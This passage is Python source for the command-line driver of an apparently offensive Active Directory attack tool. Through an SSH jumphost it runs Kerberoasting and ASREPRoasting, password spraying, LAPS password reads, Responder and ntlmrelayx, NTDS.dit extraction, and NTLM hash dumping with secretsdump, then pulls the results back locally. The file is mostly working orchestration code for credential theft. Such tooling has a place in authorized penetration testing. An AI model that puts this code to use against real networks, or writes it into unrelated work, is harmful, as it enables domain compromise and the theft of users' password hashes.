    users_parser.add_argument("--output", default="users-dump", help="Output directory")
    
    roasting_parser = subparsers.add_parser(
        "roast",
        help="Kerberoasting and ASREPRoasting"
    )
    roasting_parser.add_argument("-jh", "--jumphost", required=True)
    roasting_parser.add_argument("-dc", "--dc-ip", required=True)
    roasting_parser.add_argument("-u", "--user", required=True)
    roasting_parser.add_argument("-p", "--password", help="Password (or use LAZY_PASSWORD env)")
    roasting_parser.add_argument("-d", "--domain", required=True)
    roasting_parser.add_argument("--type", choices=["kerberoast", "asrep", "both"], default="both")
    
    spray_parser = subparsers.add_parser(
        "spray",
        help="Password spraying attack"
    )
    spray_parser.add_argument("-jh", "--jumphost", required=True)
    spray_parser.add_argument("-dc", "--dc-ip", required=True)
    spray_parser.add_argument("-p", "--password", required=True)
    spray_parser.add_argument("-d", "--domain", required=True)
    spray_parser.add_argument("-u", "--users", required=True, help="File with usernames")
    
    laps_parser = subparsers.add_parser(
        "laps",
        help="LAPS password enumeration"
    )
    laps_parser.add_argument("-jh", "--jumphost", required=True)
    laps_parser.add_argument("-dc", "--dc-ip", required=True)
    laps_parser.add_argument("-u", "--user", required=True)
    laps_parser.add_argument("-p", "--password", help="Password (or use LAZY_PASSWORD env)")
    laps_parser.add_argument("-d", "--domain", required=True)
    
    responder_parser = subparsers.add_parser(
        "responder",
        help="Start Responder"
    )
    responder_parser.add_argument("-jh", "--jumphost", required=True)
    responder_parser.add_argument("-i", "--interface", help="Network interface")
    responder_parser.add_argument("--smb", action="store_true", help="Enable SMB")
    
    ntlmrelay_parser = subparsers.add_parser(
        "relay",
        help="Start ntlmrelayx"
    )
    ntlmrelay_parser.add_argument("-jh", "--jumphost", required=True)
    ntlmrelay_parser.add_argument("-t", "--targets", required=True, help="Target list file")
    ntlmrelay_parser.add_argument("--socks", action="store_true", help="Enable SOCKS proxy")
    
    ntds_parser = subparsers.add_parser(
        "ntds",
        help="Extract NTDS.dit"
    )
    ntds_parser.add_argument("-jh", "--jumphost", required=True)
    ntds_parser.add_argument("-dc", "--dc-ip", required=True)
    ntds_parser.add_argument("-u", "--user", required=True)
    ntds_parser.add_argument("-p", "--password", help="Password (or use LAZY_PASSWORD env)")
    ntds_parser.add_argument("-d", "--domain", required=True)
    
    dump_parser = subparsers.add_parser(
        "dump-hashes",
        help="Dump NTLM hashes from NTDS files"
    )
    dump_parser.add_argument("-ntds", "--ntds-file", required=True, help="Path to ntds.dit file")
    dump_parser.add_argument("-system", "--system-file", required=True, help="Path to SYSTEM hive file")
    dump_parser.add_argument("-o", "--output", default="ntlms", help="Output directory")
    
    blood_parser = subparsers.add_parser(
        "bloodhound",
        help="Collect BloodHound data"
    )
    blood_parser.add_argument("-jh", "--jumphost", required=True)
    blood_parser.add_argument("-dc", "--dc-ip", required=True)
    blood_parser.add_argument("-u", "--user", required=True)
    blood_parser.add_argument("-p", "--password", help="Password (or use LAZY_PASSWORD env)")
    blood_parser.add_argument("-d", "--domain", required=True)
    
    parse_parser = subparsers.add_parser(
        "parse",
        help="Parse nmap XML and generate test commands"
    )
    parse_parser.add_argument("-n", "--nmap-output", required=True)
    parse_parser.add_argument("-o", "--output", default="generated-tests")
    parse_parser.add_argument("--no-http", action="store_true", help="Skip HTTP checks")
    
    return parser


def handle_users_command(args, ssh_manager: SSHConnectionManager) -> int:
    """Handle the users enumeration command."""
    password = args.password or get_credential('password')
    if not password:
        logging.error("Password required. Use -p flag or set LAZY_PASSWORD environment variable.")
        return 1
    
    enumerator = ADEnumerator(ssh_manager, args.jumphost)
    
    if not enumerator.check_tools():
        return 1
    
    output_dir = Path(args.output)
    output_dir.mkdir(exist_ok=True)
    
    users = enumerator.enumerate_enabled_users(
        args.dc_ip, args.user, password, args.domain
    )
    if users:
        with open(output_dir / "enabled_users", 'w') as f:
            f.write(users)
        print(f"[+] Saved {len(users.splitlines())} enabled users")
    
    priv_users = enumerator.enumerate_privileged_users(
        args.dc_ip, args.user, password, args.domain
    )
    if priv_users:
        with open(output_dir / "privileged_users", 'w') as f:
            f.write(priv_users)
        print("[+] Saved privileged users")
    
    descriptions = enumerator.get_user_descriptions(
        args.dc_ip, args.user, password, args.domain
    )
    if descriptions:
        with open(output_dir / "user_descriptions", 'w') as f:
            f.write(descriptions)
        print("[+] Saved user descriptions")
    
    return 0
    
    return 0


def handle_roast_command(args, ssh_manager: SSHConnectionManager) -> int:
    """Handle the roasting command."""
    password = args.password or get_credential('password')
    if not password:
        logging.error("Password required.")
        return 1
    
    roaster = Kerberoaster(ssh_manager, args.jumphost)
    
    if not roaster.check_tool():
        return 1
    
    roaster.ssh.exec_command(args.jumphost, "mkdir -p roasting")
    
    Path("roasting").mkdir(exist_ok=True)
    
    success = True
    
    if args.type in ["kerberoast", "both"]:
        print("[*] Performing Kerberoasting...", flush=True)
        ok, output = roaster.kerberoast(args.dc_ip, args.user, password, args.domain)
        if ok:
            ssh_manager.download_file(args.jumphost, "/tmp/kerberoasted", "roasting/kerberoasted")
            print("[+] Kerberoasting complete", flush=True)
        else:
            logging.error(f"Kerberoasting failed: {output}")
            success = False
    
    if args.type in ["asrep", "both"]:
        print("[*] Performing ASREPRoasting...", flush=True)
        ok, output = roaster.asreproast(args.dc_ip, args.user, password, args.domain)
        if ok:
            ssh_manager.download_file(args.jumphost, "/tmp/asreproasted", "roasting/asreproasted")
            print("[+] ASREPRoasting complete", flush=True)
        else:
            logging.error(f"ASREPRoasting failed: {output}")
            success = False
    
    return 0 if success else 1


def handle_spray_command(args, ssh_manager: SSHConnectionManager) -> int:
    """Handle password spraying command."""
    sprayer = PasswordSprayer(ssh_manager, args.jumphost)
    
    user_list = Path(args.users)
    if not user_list.exists():
        logging.error(f"User list not found: {args.users}")
        return 1
    
    remote_path = f"/tmp/spray_users_{int(time.time())}.txt"
    ssh_manager.upload_file(args.jumphost, str(user_list), remote_path)
    
    logging.info(f"Spraying password against {args.users}...")
    ok, output = sprayer.spray(args.dc_ip, args.password, args.domain, remote_path)
    
    if ok:
        print(output)
        logging.info("Spray complete")
    else:
        logging.error(f"Spray failed: {output}")
        return 1
    
    return 0


def handle_laps_command(args, ssh_manager: SSHConnectionManager) -> int:
    """Handle LAPS enumeration command."""
    password = args.password or get_credential('password')
    if not password:
        logging.error("Password required.")
        return 1
    
    laps_enum = LAPSEnumerator(ssh_manager, args.jumphost)
    
    print("[*] Enumerating LAPS passwords...", flush=True)
    ok, output = laps_enum.enumerate_laps(args.dc_ip, args.user, password, args.domain)
    
    if ok:
        if output:
            print(output)
        print("[+] LAPS enumeration complete", flush=True)
    else:
        logging.error(f"LAPS enumeration failed: {output}")
        return 1
    
    return 0


def handle_responder_command(args, ssh_manager: SSHConnectionManager) -> int:
    """Handle Responder startup command."""
    responder = ResponderController(ssh_manager, args.jumphost)
    
    missing = responder.check_tools()
    if missing:
        logging.error(f"Missing tools: {', '.join(missing)}")
        return 1
    
    interface = args.interface or responder.get_active_interface()
    if not interface:
        logging.error("Could not determine network interface")
        return 1
    
    logging.info(f"Starting Responder on {interface}...")
    if responder.start_responder(interface, enable_smb=args.smb):
        logging.info("Responder started successfully")
    else:
        return 1
    
    return 0


def handle_relay_command(args, ssh_manager: SSHConnectionManager) -> int:
    """Handle ntlmrelayx startup command."""
    if not Path(args.targets).exists():
        logging.error(f"Target list not found: {args.targets}")
        return 1
    
    remote_path = f"/tmp/relay_targets_{int(time.time())}.txt"
    ssh_manager.upload_file(args.jumphost, args.targets, remote_path)
    
    responder = ResponderController(ssh_manager, args.jumphost)
    
    logging.info("Starting ntlmrelayx...")
    if responder.start_ntlmrelayx(remote_path, socks=args.socks):
        logging.info("ntlmrelayx started successfully")
    else:
        return 1
    
    return 0


def handle_ntds_command(args, ssh_manager: SSHConnectionManager) -> int:
    """Handle NTDS extraction command."""
    password = args.password or get_credential('password')
    if not password:
        logging.error("Password required.")
        return 1
    
    auditor = NTDSAuditor(ssh_manager, args.jumphost)
    
    print("[*] Extracting NTDS.dit...", flush=True)
    ok, msg = auditor.extract_ntds(args.dc_ip, args.user, password, args.domain)
    
    if not ok:
        logging.error(f"NTDS extraction failed: {msg}")
        return 1
    
    Path("ntds").mkdir(exist_ok=True)
    print("[*] Downloading files from jumphost...", flush=True)
    ssh_manager.download_file(args.jumphost, "/tmp/ntds.dit", "ntds/ntds.dit")
    ssh_manager.download_file(args.jumphost, "/tmp/copy-system.hive", "ntds/copy-system.hive")
    
    print("[+] NTDS extraction complete", flush=True)
    print("[+] Files saved to: ntds/ntds.dit, ntds/copy-system.hive", flush=True)
    print("[*] Run 'python3 lazy-tool-v2.py dump-hashes' to dump NTLM hashes", flush=True)
    
    return 0


def handle_dump_hashes_command(args) -> int:
    """Dump NTLM hashes from NTDS files."""
    ntds_file = Path(args.ntds_file)
    system_file = Path(args.system_file)
    
    if not ntds_file.exists():
        logging.error(f"NTDS file not found: {args.ntds_file}")
        return 1
    
    if not system_file.exists():
        logging.error(f"SYSTEM hive not found: {args.system_file}")
        return 1
    
    output_dir = Path(args.output)
    output_dir.mkdir(exist_ok=True)
    
    secretsdump_cmd = None
    
    if is_tool_installed("impacket-secretsdump"):
        secretsdump_cmd = [
            "impacket-secretsdump",
            "-system", str(system_file),
            "-ntds", str(ntds_file),
            "-just-dc-ntlm",
            "-history",
            "LOCAL",
            "-outputfile", str(output_dir / "hashes")
        ]
    elif is_tool_installed("secretsdump.py"):
        secretsdump_cmd = [
            "secretsdump.py",
            "-system", str(system_file),
            "-ntds", str(ntds_file),
            "-just-dc-ntlm",
            "-history",
            "LOCAL",
            "-outputfile", str(output_dir / "hashes")
        ]
    else:
        logging.error("secretsdump not found. Install impacket: pip install impacket")
        return 1
    
    print("[*] Dumping NTLM hashes...", flush=True)
    
    try:
        result = subprocess.run(
            secretsdump_cmd,
            capture_output=True,
            text=True,
            timeout=600
        )
        
        if result.returncode == 0:
            print(f"[+] Hashes dumped successfully to {output_dir}/", flush=True)
            if result.stdout:
                print(result.stdout)
            return 0
        else:
            logging.error(f"Hash dump failed: {result.stderr}")
            return 1
            
    except subprocess.TimeoutExpired:
        logging.error("Hash dump timed out after 10 minutes")
        return 1
    except Exception as e:
        logging.error(f"Hash dump error: {e}")
        return 1


def handle_bloodhound_command(args, ssh_manager: SSHConnectionManager) -> int:
    """Handle BloodHound collection command."""
    password = args.password or get_credential('password')
    if not password:
        logging.error("Password required.")
        return 1
    
    collector = BloodHoundCollector(ssh_manager, args.jumphost)
    
    if not collector.check_tool():
        logging.error("netexec not installed on jumphost")
        return 1
    
    print("[*] Starting BloodHound data collection...", flush=True)
    print("[*] This may take a few minutes...", flush=True)
    ok, zip_path = collector.collect(args.dc_ip, args.user, password, args.domain)
    
    if ok and zip_path:
        Path("bloodhound").mkdir(exist_ok=True)
        local_zip = f"bloodhound/{args.domain}_bloodhound.zip"
        ssh_manager.download_file(args.jumphost, zip_path, local_zip)
        print(f"[+] BloodHound collection complete", flush=True)
        print(f"[+] Results saved to: {local_zip}", flush=True)
    elif ok:
        print("[+] BloodHound collection completed but zip file not found", flush=True)
    else:
        logging.error(f"BloodHound collection failed: {zip_path}")
        return 1
    
    return 0


def handle_parse_command(args) -> int:
    """Handle nmap parsing command."""
    parser = NmapParser()
    
    logging.info(f"Parsing nmap output from: {args.nmap_output}")
    parser.parse_directory(args.nmap_output)
    
    generator = SecurityTestGenerator(parser)
    script_path = generator.generate_script(args.output)
    
    logging.info(f"Generated test script: {script_path}")
    
    return 0


def handle_network_scan_command(args, config: Dict) -> int:
    """Handle network scanning command."""
    logging.info(f"Processing config: {args.config}")
    
    scanner = None
    
    for host_config in config['hosts']:
        jumphost = host_config['name']
        scanner = NetworkScanner(SSHConnectionManager(), jumphost)
        
        missing = scanner.check_requirements()
        if missing:
            logging.warning(f"Missing on {jumphost}: {', '.join(missing)}")
        
        if args.live:
            interfaces = scanner.get_interfaces()
            for iface, ip in interfaces.items():
                logging.info(f"Discovering hosts on {iface} ({ip})...")
        
        for scan in host_config['scans']:
            target = scan['target']
            source = scan.get('source')
            
            if args.dry_run:
                print(f"[DRY-RUN] nmap -e {source} -sS -p- {target}")
            else:
                logging.info(f"Starting scan: {target}")
                scanner.run_nmap_scan(target, interface=source)
    
    return 0


def main():
    """Main entry point."""
    print_banner()
    
    parser = create_argument_parser()
    args = parser.parse_args()
    
    log_level = "DEBUG" if args.verbose else "ERROR" if args.quiet else "INFO"
    logger = setup_logging(args.log, log_level)
    
    ssh_manager = SSHConnectionManager()
    
    try:
        if args.mode == "users":
            return handle_users_command(args, ssh_manager)
        
        elif args.mode == "roast":
            return handle_roast_command(args, ssh_manager)
        
        elif args.mode == "spray":
            return handle_spray_command(args, ssh_manager)
        
        elif args.mode == "laps":
            return handle_laps_command(args, ssh_manager)
        
        elif args.mode == "responder":
            return handle_responder_command(args, ssh_manager)
        
        elif args.mode == "relay":
            return handle_relay_command(args, ssh_manager)
        
        elif args.mode == "ntds":
            return handle_ntds_command(args, ssh_manager)
        
        elif args.mode == "dump-hashes":
            return handle_dump_hashes_command(args)
        
        elif args.mode == "bloodhound":
            return handle_bloodhound_command(args, ssh_manager)
        
        elif args.mode == "parse":
            return handle_parse_command(args)
        
        elif args.mode == "network-scan":
            config = load_config(args.config)
            return handle_network_scan_command(args, config)
        
        else:
            parser.print_help()
            return 1
    
    except KeyboardInterrupt:
        logging.info("Operation cancelled by user")
        return 130
    
    except Exception as e:
        logging.exception(f"Unexpected error: {e}")
        return 1
    
    finally:
        ssh_manager.close_all()


if __name__ == "__main__":
    result = main()
    sys.stdout.flush()
    sys.stderr.flush()
    sys.exit(result)
